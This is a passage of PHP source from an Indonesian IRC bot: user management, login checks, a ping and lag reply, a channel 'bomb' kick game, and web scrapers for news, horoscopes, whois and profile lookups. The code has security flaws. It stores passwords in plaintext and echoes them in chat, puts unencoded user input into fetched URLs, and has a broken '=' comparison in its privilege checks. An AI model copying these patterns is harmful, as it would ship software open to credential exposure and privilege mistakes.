        unset ($user_chan_arr[$chan]);
        return "ok";
    }
    function destroy_allchan(){
        global $user_chan_arr;
        foreach ($user_chan_arr as $cur_xchan) {
		unset ($user_chan_arr[$cur_xchan["chan"]]);
	}
        unset ($user_chan_arr);
        return "ok";
    }
    #####################
    
    function user_list($nick){
        global $auth;
        $userlist="";
	foreach ($auth as $ulist) {if($ulist["name"]){$userlist .= $ulist["name"].'('.$ulist["status"].')';}}
        return $userlist;
    }
    function add_user($sock,$nick,$user,$pass,$level){
        global $auth,$bot;
        $anick=$nick;
        $nick = strtolower($nick);
	$user = strtolower($user);
        $level = strtolower($level);
        if ($auth["$nick"]["auth"]==2) {
            if ($auth["$nick"]["status"]=="Owner") {
                if ($level=="master" || $level=="user" || $level="admin") {
                    if(!$auth["$user"]["name"]){
                    $auth["$user"]["name"] = $user;
                    $auth["$user"]["pass"] = $pass;
                    $auth["$user"]["status"] = $level;
                    $auth["$user"]["auth"] = 1;
                    $this->notice($sock,$nick,'SwEp LaH ['.$user.'] '.$level.' QuH');
                    $this->notice($sock,$user,''.$anick.' ADD KaMu TuK JaDi '.$level.' DeNGaN PaSSWoRd: '.$pass);
                    $this->notice($sock,$user,'/msg '.$bot['nick'].' ^login <password>');
                    }else{
                        $this->notice($sock,$nick,$user .' is already exist on '.$auth["$user"]["status"].' list.');
                    }
		} else {$this->notice($sock,$nick,'SaLaH CoMMaNd BoZz! Type:.Adduser <nick> <pass> <admin|master|user>');}
            }
            elseif ($auth["$nick"]["status"]=="admin") {
		if ($level=="master" || $level=="user") {
                    if(!$auth["$user"]["name"]){
                    $auth["$user"]["name"] = $user;
                    $auth["$user"]["pass"] = $pass;
                    $auth["$user"]["status"] = $level;
                    $auth["$user"]["auth"] = 1;
                    $this->notice($sock,$nick,'SwEp LaH ['.$user.'] '.$level.' QuH');
                    $this->notice($sock,$user,''.$anick.' ADD KaMu TuK JaDi '.$level.' DeNGaN PaSSWoRd: '.$pass);
                    $this->notice($sock,$user,'/msg '.$bot['nick'].' ^login <password>');
                    }else{
                        $this->notice($sock,$nick,$user .' is already exist on '.$auth["$user"]["status"].' list.');
                    }
		} else {$this->notice($sock,$nick,'SaLaH CoMMaNd BoZz! Type:.Adduser <nick> <pass> <master|user>');}
            }
            elseif ($auth["$nick"]["status"]=="master") {
		if (!$auth["$nick"]["name"]) {
                    if ($level=="user") {
			$auth["$user"]["name"] = $user;
			$auth["$user"]["pass"] = $pass;
			$auth["$user"]["status"] = $level;
			$auth["$user"]["auth"] = 1;
                        $this->notice($sock,$nick,'SwEp LaH ['.$user.'] '.$level.' QuH');
                        $this->notice($sock,$user,''.$anick.' ADD KaMu TuK JaDi '.$level.' DeNGaN PaSSWoRd: '.$pass);
                        $this->notice($sock,$user,'/msg '.$bot['nick'].' ^login <password>');
                    } else { $this->notice($sock,$nick,'Wrong Command! Type:.Adduser <nick> <pass> user'); }
		} else { $this->notice($sock,$nick,$user .' is already exist on '.$auth["$user"]["status"].' list.'); }
            } else {$this->notice($sock,$nick,'Unknown Status! Your Status is '.$auth["$nick"]["status"]);}
        }
    }
    function del_user($sock,$nick,$user){
        global $auth;
        $anick=$nick;
        $nick = strtolower($nick);
	$user = strtolower($user);
        if ($auth["$nick"]["auth"]==2) {
            if ($auth["$nick"]["status"]=="Owner") {
		if ($auth["$user"]["status"]=="master" || $auth["$user"]["status"]=="user" || $auth["$user"]["status"]=="admin") {
                    $this->notice($sock,$nick,'DeL YoU To ['.$user.'] '.$auth["$user"]["status"].' LIsT');
                    $this->msg($sock,$user,''.$anick.' DeL YoU To '.$auth["$user"]["status"].' LIsT');
                    unset($auth["$user"]["name"]); unset($auth["$user"]["pass"]); unset($auth["$user"]["status"]);unset($auth["$user"]["auth"]); unset($auth["$user"]["time"]);
                    unset($auth["$user"]["ident"]); unset($auth["$user"]["host"]);unset($auth["$user"]["seen"]); unset($auth["$user"]);
                } else {$this->msg($sock,$nick,'SaLaH CoMMaNd BoZz! Type: .Deluser <nick>'); }
            }
            elseif ($auth["$nick"]["status"]=="admin") {
		if ($auth["$user"]["status"]=="master" || $auth["$user"]["status"]=="user") {
                    $this->notice($sock,$nick,'DeL YoU To ['.$user.'] '.$auth["$user"]["status"].' LIsT');
                    $this->msg($sock,$user,''.$anick.' DeL YoU To '.$auth["$user"]["status"].' LIsT');
                    unset($auth["$user"]["name"]); unset($auth["$user"]["pass"]); unset($auth["$user"]["status"]);unset($auth["$user"]["auth"]); unset($auth["$user"]["time"]);
                    unset($auth["$user"]["ident"]); unset($auth["$user"]["host"]);unset($auth["$user"]["seen"]); unset($auth["$user"]);
                } else {$this->msg($sock,$nick,'SaLaH CoMMaNd BoZz! Type: .Deluser <nick>'); }
            }
            elseif ($auth["$nick"]["status"]=="master") {
                if ($auth["$user"]["status"]=="user") {
                    $this->notice($sock,$nick,'DeL YoU To ['.$user.'] '.$auth["$user"]["status"].' LIsT');
                    $this->msg($sock,$user,''.$anick.' DeL YoU To '.$auth["$user"]["status"].' LIsT');
                    unset($auth["$user"]["name"]); unset($auth["$user"]["pass"]); unset($auth["$user"]["status"]);unset($auth["$user"]["auth"]); unset($auth["$user"]["time"]);
                    unset($auth["$user"]["ident"]); unset($auth["$user"]["host"]);unset($auth["$user"]["seen"]); unset($auth["$user"]);
                } else { $this->msg($sock,$nick,'SaLaH CoMMaNd BoZz! Type: .Deluser <nick>'); }
            }
	}
    }
    function chgpass_user($sock,$nick,$oldpass,$newpass){
        global $auth;
        $anick=$nick;
        $nick = strtolower($nick);
        if ($auth["$nick"]["auth"]==2) {
	    if ($oldpass===$auth["$nick"]["pass"]) {
		$auth["$nick"]["pass"] = $newpass;
                $this->notice($sock,$nick,'Password set to: 4'.$auth["$nick"]["pass"].'4');
            } else {$this->msg($sock,$nick,'4WRONG PASSWORD...');}
	}
    }
    function level_user($nick){
        global $auth;
        $nick=strtolower($nick);
        if ($auth["$nick"]["status"]=="user"){$stauth=1;}
	elseif ($auth["$nick"]["status"]=="master"){$stauth=2;}
	elseif (strtolower($auth["$nick"]["status"])=="admin"){$stauth=3;}
        elseif (strtolower($auth["$nick"]["status"])=="owner"){$stauth=4;}
        else{$stauth=0;};
        return $stauth;
    }
    function is_userbot($nick){
        global $auth;
        $isuser=0;$nick=strtolower($nick);
        if ($auth["$nick"]) {if ($auth["$nick"]["pass"]) {$isuser=1;}}
        return $isuser;
    }
    function is_loginbot($nick,$ident,$host){
        global $auth;
        $islogin=0;$nick=strtolower($nick);
        if($this->is_userbot($nick)==1){
            if($auth["$nick"]["auth"]==2){
                if($auth["$nick"]["ident"]==$ident){
                    if($auth["$nick"]["host"]==$host){
                        $timelog=time()- $auth["$nick"]["time"];
                        if($timelog<=3600){ $auth["$nick"]["time"]=time();$islogin=1;}else{$auth["$nick"]["auth"]=1;}
                    }else{$auth["$nick"]["auth"]=1;}
                }else{$auth["$nick"]["auth"]=1;}
            }else{$auth["$nick"]["auth"]=1;}
        }
        return $islogin;
    }
    function loginbot($nick,$ident,$host,$pass){
        global $auth;
        $sukseslog=0;$nick=strtolower($nick);
        if($this->is_userbot($nick)==1){
            if($pass===$auth["$nick"]["pass"]){
                $auth["$nick"]["auth"]=2;$auth["$nick"]["time"]=time();$sukseslog=1;
            }
        }
        return $sukseslog;
    }
    function logoutbot($nick){
        global $auth;
        $sukseslog=0;$nick=strtolower($nick);
        if($this->is_userbot($nick)==1){
                $auth["$nick"]["auth"]=1;$auth["$nick"]["time"]=time();$sukseslog=1;
        }
        return $sukseslog;
    }
    ###############################
    
    function stuf_ping($sock,$chan,$nick){
        global $ping;
        $sendping=time();$ping["$sendping"]["ping"] = time();
	$ping["$sendping"]["chan"] = $chan;$ping["$sendping"]["nick"] = strtolower($nick);
	$this->msg($sock,$nick,'PING '.$ping["$sendping"]["ping"].'');
    }
    function stuf_lag($sock,$nick,$dataping){
        global $ping;
        $dataping=str_replace(chr(1),"",$dataping);$dataping=str_replace("\r","",$dataping);
        $dataping=str_replace("\n","",$dataping);$dataping=str_replace("","",$dataping);
        if ($ping["$dataping"]["ping"]==$dataping && $ping["$dataping"]["nick"]==strtolower($nick)){
            $pong = time();$pptime = $pong - $dataping;$meni = "";
            $wakptime=$pptime;
            if ($pptime>=60) {
                $bag = $pptime / 60;$meni = floor($bag)."mins ";$sis = $pptime - ($meni*60);$pptime = $sis;
            }
            $deti = $pptime."secs";$pptime = "$meni$deti";
            $mswktny=array("0","1","2","3","4","5","6","7","8","9");
            $ttlny =array("32","42","46","48","56","62");
            $wktny1 = $mswktny[rand(0,count($mswktny) - 1)];
            $wktny2 = $mswktny[rand(0,count($mswktny) - 1)];
            $wktny3 = $mswktny[rand(0,count($mswktny) - 1)];
            $ttlar= $ttlny[rand(0,count($ttlny) - 1)];
            $mswktny = ( $wktny1.$wktny2.$wktny3 );
            $wktuping = ( $wakptime.'.'.$mswktny );
            if ($wakptime<=5){$stping="4aMan BoZzZ 8";
            }elseif($wakptime>=5){$stping="8Lumayan BoZzZ 4";
            }elseif($wakptime>=10){$stping="9LemoD BoZzZ 4";
            }elseif($wakptime>=15){$stping="4MacEt eaH 9";
            }elseif($wakptime>=20){$stping="11GanTi SerVer aJa 13";
            }elseif($wakptime>=25){$stping="13BuanG aJa DaH Tuh Hp 11";
            }
            $this->msg($sock,$ping["$dataping"]["chan"],'4P9oNG 4L13aG 4R8ePLy9 '.$nick.' 4:13 '.$pptime);
            $this->notice($sock,$nick,$stping.$nick);
            unset($ping["$dataping"]["nick"]);unset($ping["$dataping"]["ping"]);unset($ping["$dataping"]["chan"]);
        }
    }
    #############################
    function stuf_potong($sock,$nickna,$chan,$pilwar){
        global $warnabenar,$bw,$targetboom,$goboom,$onboom,$chanboom;
        $pilihanwar=strtolower($pilwar);$warnabenar=strtolower($warnabenar);
        if(strtolower($nickna)==strtolower($targetboom) && strtolower($chanboom)==strtolower($chan)){
            if($pilihanwar==strtolower($bw[0]) || $pilihanwar==strtolower($bw[1]) || $pilihanwar=="biru" ){
                if($warnabenar==$pilihanwar){
                    $this->msg($sock,$chan,'Selamat '.$nickna.', kamu berhasil menjinakan Bom!!');
                    $this->mode($sock,'+vvv',$chan,$nickna);
		}
		else{
                  //  $this->kickserv($sock,$chan,$nickna,'0,4BOOOOOOMMMM!!!!! Selamat anda kena bom kasian deh lo.');
                    $this->kick($sock,$chan,$nickna,'0,4BOOOOOOMMMM!!!!! Selamat anda kena bom kasian deh lo.');
		}
                $goboom=0;$onboom="off";$targetboom="";$chanboom="";
           }
        }
    }
    function stuf_bom($sock,$chan,$targetbm){
        global $chanboom,$bot,$onboom,$warnaboom,$targetboom,$bw,$goboom,$tmpwbom,$tmboom,$warnabenar,$timeboom;
        if(strpos(strtolower($this->show_nickchan($chan)),' '.strtolower($targetbm).' ') && $onboom=="off" && $targetbm!=strtolower($bot['nick'])){
            $onboom="on";$goboom=0;$targetboom=$targetbm;$chanboom=$chan;
            $tmpwbom=$warnaboom;$wrnb=explode(";",$tmpwbom);
            $bw[0]=$wrnb[rand(0,count($wrnb) - 1)];unset($wrnb);
            $tmpwbom=str_replace($bw[0],"",$tmpwbom);$tmpwbom=str_replace(";;",";",$tmpwbom);
            $wrnb=explode(";",$tmpwbom);
            $bw[1]=$wrnb[rand(0,count($wrnb) - 1)];
            unset($wrnb);
            $tmboom=time();$warnabenar=$bw[rand(0,count($bw) - 1)];
            $this->act($sock,$chan,'memasukan BOM ke dalam swempak '.$targetbm .' '.$warnabenar);
            $this->msg($sock,$chan,$targetbm.'!! km punya waktu ['.$timeboom.'] detik. Jinakkan Bom dengan memotong kabel yg benar. Dan hanya ada tiga kabel. '.$bw[0] .', '.$bw[1].' dan Biru');
       }
    }
    #############################
    function stuf_ison($sock,$msg){
        global $listison,$chanson,$ada2,$ada1;
        $listson=strtolower($msg);$xpgetison=explode(" ",$listson);
	$i=0;$jmlolol=0;
	foreach ($xpgetison as $pgetlist){if($pgetlist){$i++;$sonson[$i]=$pgetlist;$jmlolol=$i;}}
	$i=0;
	foreach ($listison as $pgetlist){if ($pgetlist){$i++;$lsonson[$i]=$pgetlist;$jmlson=$i;}}
	$dafonline="";$dafoffline="";
	for ($i = 1; $i <= $jmlson; $i++) {
            $satup=$lsonson[$i];$ds=0;
            for ($p = 1; $p <= $jmlolol; $p++) {if ($satup==$sonson[$p]){$ds=1;}}
            if ($ds==1){if(!$ada1["$satup"]){$dafonline .=$satup.' ';$ada1["$satup"]=true;$ada2["$satup"]=false;}}
            else{if(!$ada2["$satup"]){$dafoffline .=$satup.' ';$ada2["$satup"]=true;$ada1["$satup"]=false;}}
	}
	$dafonline=ltrim($dafonline);$dafonline=rtrim($dafonline);$dafoffline=ltrim($dafoffline);$dafoffline=rtrim($dafoffline);
	if ($dafonline){fputs($sock, 'PRIVMSG '. $chanson .' :4..8.:3::7 OnLiNe 3::8:.4.. '.$dafonline . CRLF);}
	if ($dafoffline){fputs($sock, 'PRIVMSG '. $chanson .' :14.:4[14:.7 OffLiNe 14.:4]14:. '.$dafoffline . CRLF);}
	unset($lsonson);unset($sonson);
    }
    function add_ison($str){
        global $listison;
        $str=strtolower($str);
        if(in_array($str,$listison)){return 0;}
        else{array_push($listison,$str);return 1;}
        
    }
    function show_ison(){
        global $listison;
        $str_ison="";
        foreach ($listison as $lstr){$str_ison.=$lstr . ' ';}
        $str_ison=str_replace("  "," ",$str_ison);$str_ison=ltrim($str_ison);$str_ison=rtrim($str_ison);
        return $str_ison;
    }
    function del_ison($str){
        global $listison;
        $str_ison="";$str=strtolower($str);
        if(in_array($str,$listison)){
            foreach ($listison as $lstr){
                if(strtolower($str)!=strtolower($lstr)){
                    $str_ison.=$lstr . ';';
                }
            }
            $str_ison=str_replace(";;",";",$str_ison);$str_ison=ltrim($str_ison,";");$str_ison=rtrim($str_ison,";");
            $listison=explode(";",strtolower($str_ison));
            return 1;
        }
        else{return 0;}
    }
    ###############################
    function auto_cy($sock){
        global $systembot,$user_chan_arr;
        $this->send($sock,"PING :88888654476");
        foreach ($user_chan_arr as $cur_xchan) {
            if($systembot['AUTOCYCLE'][strtoupper($cur_xchan["chan"])]=="3ON"){
                $this->part($sock,$cur_xchan["chan"],$this->rnd_cycle());sleep (2);$this->join($sock,$cur_xchan["chan"]);sleep(3);
            }
	}
        return "";
    }
    
    ##############################
    function mod_lookfs($sock,$msg){
        $this->send($sock,"PING :0000927651");
        $fslist=$msg;
        $whoisiplist = "http://www.friendster.com/search/user?country=ID&query=$fslist";
        $lihatiplist = fopen ($whoisiplist, "rb");
        $spasipol = "";
        $katacari=strtolower("View Profile");
        do {
             $barislistip = fread($lihatiplist, 512);
             if(strlen($barislistip) == 0){ break; }
             $spasipol .= $barislistip;
        } while(true);
        fclose ($lihatiplist);
        $spasipol= strtolower($spasipol);
        $spasipol= str_replace("  "," ",$spasipol);
        $spasipol= str_replace("\n"," ",$spasipol);
        $spasipol= str_replace(chr(9)," ",$spasipol);
        $spasipol= str_replace("\r"," ",$spasipol);
        $spasipol= str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$spasipol);
        for ($i = 1; $i <= 10; $i++) {$spasipol = str_replace("  "," ",$spasipol);}
        $spasipol = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$spasipol);
        $ipnya=$spasipol;      
        $lenspasipol=strlen($ipnya);
        if(ereg("search returned zero", $ipnya)){
            $ipnya="SaLaH BoZzZ...";
        }
        else{
        $ltextip=0;
        $leftipnya=0;
        $adaip=0;
        do{
           $ltextip=$ltextip+1;
           $iphasil=substr($ipnya,$ltextip,$lenspasipol);
           $iphasil=substr($iphasil,0,strlen($katacari));
           $iphasil=strtolower($iphasil);
           if($iphasil==$katacari){$leftipnya=$ltextip;$adaip=1;break;}
           if($ltextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,$leftipnya+strlen($katacari),$lenspasipol);


        $katacari=strtolower("href=");
        $ltextip=0;
        $leftipnya=0;
        $adaip=0;
        do{
           $ltextip=$ltextip+1;
           $iphasil=substr($ipnya,$ltextip,$lenspasipol);
           $iphasil=substr($iphasil,0,strlen($katacari));
           $iphasil=strtolower($iphasil);
           if($iphasil==$katacari){$leftipnya=$ltextip;$adaip=1;break;}
           if($ltextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,$leftipnya+strlen($katacari),$lenspasipol);
        $katacari=strtolower("<div class=");
        $lenspasipol=strlen($ipnya);
        $rtextip=0;
        $rightipnya=0;
        do{
           $rtextip=$rtextip+1;
           $iphasil=substr($ipnya,$rtextip,$lenspasipol);
           $iphasil=substr($iphasil,0,strlen($katacari));
           $iphasil=strtolower($iphasil);
           if($iphasil==$katacari){$rightipnya=$rtextip;$adaip=1;break;}
           if($rtextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,0,$rightipnya);
        $ipnya= str_replace("</a>"," ",$ipnya);
        $ipnya= str_replace("<span class","",$ipnya);
        $ipnya= str_replace("entitytype","",$ipnya);
        $ipnya= str_replace("(musician)","",$ipnya);
        $ipnya= str_replace("</span>","",$ipnya);
        $ipnya= str_replace("</div>"," ",$ipnya);
        $ipnya= str_replace("<br>"," ",$ipnya);
        $ipnya= str_replace(">"," ",$ipnya);
        }     
        return $ipnya;      
    }
    function mod_astro($astro){
        global $zodiak;
        $astro = strtolower($astro);
        $this->send($sock,"PING :1097658652");
        if (in_array($astro, $zodiak)) {
            $pages = "http://www.astaga.com/astrologi/?cat=$astro";
            $handi = fopen ($pages, "rb");
            $konten = "";
            do {
               $baris = fread($handi, 512);
               if (strlen($baris) == 0) { break; }
               $konten .= $baris;
            } while(true);
            fclose ($handi);
            $this->send($sock,"PING :1097658651");
            $zod1 = stristr($konten,'<td id=ast><p>');
            $zod2 = stristr($zod1,'</table>');
            $bintang = str_replace($zod2,"",$zod1);
            $bintang = str_replace("\n","",$bintang);
            $bintang = str_replace("<td id=ast><p>","".ucfirst(strtolower($astro))." ",$bintang);
            $bintang = str_replace("</p>"," ",$bintang);
            $bintang = str_replace("<p><b>","",$bintang);
            $bintang = str_replace("</b>","",$bintang);
            $bintang = str_replace("</td>","",$bintang);
            $bintang = str_replace("<b>","",$bintang);
            $bintang = str_replace("</td>","",$bintang);
            $bintang = str_replace("</tr>","",$bintang);
            $bintang = str_replace("<tr>","",$bintang);
            $zod3 = stristr($bintang,'<td colspan=2 id=ast bgcolor="#e0e0e0">');
            $bintang = str_replace($zod3,"",$bintang);
            return $bintang;
        }
        else{
            return "Maaf nama bintang yg km masukan tdk ada";
        }

    }
    function mod_lookberita($sock){
        $this->send($sock,"PING :0000927651");
        $tanggalsekarang=date("j/m/Y");
        $whoisiplist = "http://berita.liputan6.com";
        $lihatiplist = fopen ($whoisiplist, "rb");
        $spasipol = "";
        do {
             $barislistip = fread($lihatiplist, 512);
             if(strlen($barislistip) == 0){ break; }
             $spasipol .= $barislistip;
        } while(true);
        fclose ($lihatiplist);
        $spasipol= strtolower($spasipol);
        $spasipol= str_replace("  "," ",$spasipol);
        $spasipol= str_replace("\n","",$spasipol);
        $spasipol= str_replace(chr(9),"",$spasipol);
        $spasipol= str_replace("\r","",$spasipol);
        $spasipol= str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$spasipol);
        for ($i = 1; $i <= 10; $i++) {$spasipol = str_replace("  "," ",$spasipol);}
        $spasipol = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$spasipol);
        $ipnya=$spasipol;      
        $lenspasipol=strlen($ipnya);
        if(ereg("no entries found", $ipnya)){
            $ipnya="Ga nGeRTi Saia BoZzZ..";
        }
        else{
        $ltextip=0;
        $leftipnya=0;
        $adaip=0;
        do{
           $ltextip=$ltextip+1;
           $iphasil=substr($ipnya,$ltextip,$lenspasipol);
           $iphasil=substr($iphasil,0,strlen($tanggalsekarang));
           $iphasil=strtoupper($iphasil);
           if($iphasil==$tanggalsekarang){$leftipnya=$ltextip+18;$adaip=1;break;}
           if($ltextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,$leftipnya,$lenspasipol);
        $lenspasipol=strlen($ipnya);
        $rtextip=0;
        $rightipnya=0;
        do{
           $rtextip=$rtextip+1;
           $iphasil=substr($ipnya,$rtextip,$lenspasipol);
           $iphasil=substr($iphasil,0,6);
           $iphasil=strtolower($iphasil);
           if($iphasil=="</div>"){$rightipnya=$rtextip;$adaip=1;break;}
           if($rtextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,0,$rightipnya);
        }
        $ipnya=str_replace("</h6>"," 4",$ipnya);
        $ipnya=str_replace("</span>"," 4",$ipnya);
        $ipnya=str_replace("<a href="," ",$ipnya);
        $ipnya=str_replace(">","",$ipnya);
        $ipnya=str_replace("</a>"," ",$ipnya);
        $ipnya=str_replace("</li>"," ",$ipnya);
        $ipnya=str_replace("<span","",$ipnya);
        $ipnya=str_replace("<span","",$ipnya);
        $ipnya=str_replace("<span","",$ipnya);
        $ipnya=str_replace("class=","",$ipnya);
        $ipnya=str_replace("time","",$ipnya);

        if(strlen($ipnya) >= 225 ){$ipnya=substr($ipnya,0,225);}
        global $systembot,$user_chan_arr;
        foreach ($user_chan_arr as $cur_xchan) {
            if($systembot['BERITA'][strtoupper($cur_xchan["chan"])]=="3ON"){
                $this->msg($sock,$cur_xchan["chan"],'12<3<11(04Info11)3>12> 12'.$ipnya);sleep (2);
            }
	}
        $ipnya="";
        return $ipnya;
    }
    function mod_lookberitaperson($sock){
        $this->send($sock,"PING :0000927651");
        $tanggalsekarang=date("j/m/Y");
        $whoisiplist = "http://berita.liputan6.com";
        $lihatiplist = fopen ($whoisiplist, "rb");
        $spasipol = "";
        do {
             $barislistip = fread($lihatiplist, 512);
             if(strlen($barislistip) == 0){ break; }
             $spasipol .= $barislistip;
        } while(true);
        fclose ($lihatiplist);
        $spasipol= strtolower($spasipol);
        $spasipol= str_replace("  "," ",$spasipol);
        $spasipol= str_replace("\n","",$spasipol);
        $spasipol= str_replace(chr(9),"",$spasipol);
        $spasipol= str_replace("\r","",$spasipol);
        $spasipol= str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$spasipol);
        for ($i = 1; $i <= 10; $i++) {$spasipol = str_replace("  "," ",$spasipol);}
        $spasipol = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$spasipol);
        $ipnya=$spasipol;      
        $lenspasipol=strlen($ipnya);
        if(ereg("no entries found", $ipnya)){
            $ipnya="Gak nGeRTi Saia BoZzZ..";
        }
        else{
        $ltextip=0;
        $leftipnya=0;
        $adaip=0;
        do{
           $ltextip=$ltextip+1;
           $iphasil=substr($ipnya,$ltextip,$lenspasipol);
           $iphasil=substr($iphasil,0,strlen($tanggalsekarang));
           $iphasil=strtoupper($iphasil);
           if($iphasil==$tanggalsekarang){$leftipnya=$ltextip+18;$adaip=1;break;}
           if($ltextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,$leftipnya,$lenspasipol);
        $lenspasipol=strlen($ipnya);
        $rtextip=0;
        $rightipnya=0;
        do{
           $rtextip=$rtextip+1;
           $iphasil=substr($ipnya,$rtextip,$lenspasipol);
           $iphasil=substr($iphasil,0,6);
           $iphasil=strtolower($iphasil);
           if($iphasil=="</div>"){$rightipnya=$rtextip;$adaip=1;break;}
           if($rtextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,0,$rightipnya);
        }
        $ipnya=str_replace("</h6>"," 4",$ipnya);
        $ipnya=str_replace("</span>"," 4",$ipnya);
        $ipnya=str_replace("<a href="," ",$ipnya);
        $ipnya=str_replace(">","",$ipnya);
        $ipnya=str_replace("</a>"," ",$ipnya);
        $ipnya=str_replace("</li>"," ",$ipnya);
        $ipnya=str_replace("<span","",$ipnya);
        $ipnya=str_replace("<span","",$ipnya);
        $ipnya=str_replace("<span","",$ipnya);
        $ipnya=str_replace("class=","",$ipnya);
        $ipnya=str_replace("time","",$ipnya);

        if(strlen($ipnya) >= 225 ){$ipnya=substr($ipnya,0,225);}
        return $ipnya;
    }
    function mod_kirimsms($sock,$nomorsms,$msg){
        $this->send($sock,"PING :0000927651");
        $nomorsmske=$nomorsms;$pesansms=$msg;
        $websmsgratisnya = "";
        $lihatiplist = fopen ($websmsgratisnya, "rb");
        $spasipol = "";
        do {
             $barislistip = fread($lihatiplist, 512);
             if(strlen($barislistip) == 0){ break; }
             $spasipol .= $barislistip;
        } while(true);
        fclose ($lihatiplist);
        $spasipol= strtolower($spasipol);
        $spasipol= str_replace("  "," ",$spasipol);
        $spasipol= str_replace("\n","",$spasipol);
        $spasipol= str_replace(chr(9),"",$spasipol);
        $spasipol= str_replace("\r","",$spasipol);
        $spasipol= str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$spasipol);
        for ($i = 1; $i <= 10; $i++) {$spasipol = str_replace("  "," ",$spasipol);}
        $spasipol = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$spasipol);
        $ipnya=$spasipol;      
        $lenspasipol=strlen($ipnya);
        if(ereg("no entries found", $ipnya)){
            $ipnya="Gagal";
        }else{$ipnya="Terkirim ke ".$nomorsmske;}

        return $ipnya;
    }
    function mod_lookip($sock,$msg){
        $this->send($sock,"PING :0000927651");
        $iplist=$msg;
        $whoisiplist = "http://wq.apnic.net/apnic-bin/whois.pl?searchtext=$iplist";
        $lihatiplist = fopen ($whoisiplist, "rb");
        $spasipol = "";
        do {
             $barislistip = fread($lihatiplist, 512);
             if(strlen($barislistip) == 0){ break; }
             $spasipol .= $barislistip;
        } while(true);
        fclose ($lihatiplist);
        $spasipol= strtolower($spasipol);
        $spasipol= str_replace("  "," ",$spasipol);
        $spasipol= str_replace("\n","",$spasipol);
        $spasipol= str_replace(chr(9),"",$spasipol);
        $spasipol= str_replace("\r","",$spasipol);
        $spasipol= str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$spasipol);
        for ($i = 1; $i <= 10; $i++) {$spasipol = str_replace("  "," ",$spasipol);}
        $spasipol = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$spasipol);
        $ipnya=$spasipol;      
        $lenspasipol=strlen($ipnya);
        if(ereg("no entries found", $ipnya)){
            $ipnya="Gak nGeRTi Saia BoZzZ..";
        }
        else{
        $ltextip=0;
        $leftipnya=0;
        $adaip=0;
        do{
           $ltextip=$ltextip+1;
           $iphasil=substr($ipnya,$ltextip,$lenspasipol);
           $iphasil=substr($iphasil,0,7);
           $iphasil=strtolower($iphasil);
           if($iphasil=="netname"){$leftipnya=$ltextip;$adaip=1;break;}
           if($ltextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,$leftipnya,$lenspasipol);
        $lenspasipol=strlen($ipnya);
        $rtextip=0;
        $rightipnya=0;
        do{
           $rtextip=$rtextip+1;
           $iphasil=substr($ipnya,$rtextip,$lenspasipol);
           $iphasil=substr($iphasil,0,7);
           $iphasil=strtolower($iphasil);
           if($iphasil=="admin-c"){$rightipnya=$rtextip;$adaip=1;break;}
           if($rtextip>=$lenspasipol){$adaip=0;break;                 }
        } while(true);
        $ipnya=substr($ipnya,0,$rightipnya);
        }
        $ipnya=str_replace("  ","",$ipnya);
        $ipnya=str_replace("--"," ",$ipnya);
        $ipnya=str_replace("__","",$ipnya);
        $ipnya=str_replace("**","",$ipnya);
        $ipnya=str_replace("--"," ",$ipnya);
        $ipnya=str_replace("remarks:","",$ipnya);
        $ipnya=str_replace("descr:","",$ipnya);
        $ipnya=str_replace("country:"," negara:",$ipnya);
        $ipnya=str_replace("<a href=","",$ipnya);
        $ipnya=str_replace("</a>","",$ipnya);
        $ipnya=str_replace(">","",$ipnya);
        $ipnya=str_replace("important:","",$ipnya);

        return $ipnya;
        
    }
    function mod_uspoof($sock,$msg){
        global $isisp,$jmlspoof;
        $this->send($sock,"PING :0000927651");
        $spoof=strtolower($msg);
	$spallnet = "http://www.allnetwork.or.id/Pendaftaran/Personal_spoof/?mode=view&server=$spoof";
	///$spallnet="http://localhost/spoof1.html";
	$handisp = fopen ($spallnet, "rb");
	$kontensp = "";
        do {
		$barissp = fread($handisp, 512);
		if (strlen($barissp) == 0) { break; }
		$kontensp .= $barissp;
	} while(true);
	fclose ($handisp);
	$kontensp=strtolower($kontensp);
	$kontensp = str_replace("  "," ",$kontensp);
	$kontensp = str_replace("\n","",$kontensp);
	$kontensp = str_replace(chr(9),"",$kontensp);
	$kontensp = str_replace("\r","",$kontensp);
	$kontensp = str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$kontensp);
	for ($i = 1; $i <= 10; $i++) {$kontensp = str_replace("  "," ",$kontensp);}
	$kontensp = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$kontensp);
	$tmpjml1=stristr($kontensp,"<tr bgcolor=yellow><td colspan=10 align=right>found ");
	$tmpjml2=stristr($kontensp," data</td></tr>");
								
	$tmpjml=str_replace($tmpjml2,"",$tmpjml1);
	$tmpjml=str_replace("<tr bgcolor=yellow><td colspan=10 align=right>found ","",$tmpjml);
	$kontensp = str_replace("</td> <td>","</td><td>",$kontensp);
	$kontensp = str_replace("<tr bgcolor=white> <td align=right>","<tr bgcolor=white><td align=right>",$kontensp);
	$kontensp = str_replace("</tr> <tr","</tr><tr",$kontensp);
	$kontensp =  str_replace(" </td>","</td>",$kontensp);
